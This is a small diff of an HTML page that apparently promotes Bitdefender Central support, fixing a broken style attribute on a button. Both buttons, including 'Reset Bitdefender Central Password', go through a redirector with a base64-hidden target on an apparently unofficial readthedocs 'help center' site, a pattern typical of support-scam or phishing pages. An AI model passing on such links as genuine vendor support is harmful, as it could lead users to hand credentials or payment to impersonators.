@@ -93,7 +93,7 @@ With just a few clicks, you can secure your entire digital life—computers, pho
         <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Bitdefender Central Support Center
         </a>
-        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA=="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9iaXRkZWZlbmRlcmNlbnRyYWxoZWxwY2VudGVyLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Reset Bitdefender Central Password
         </a>
     </div>
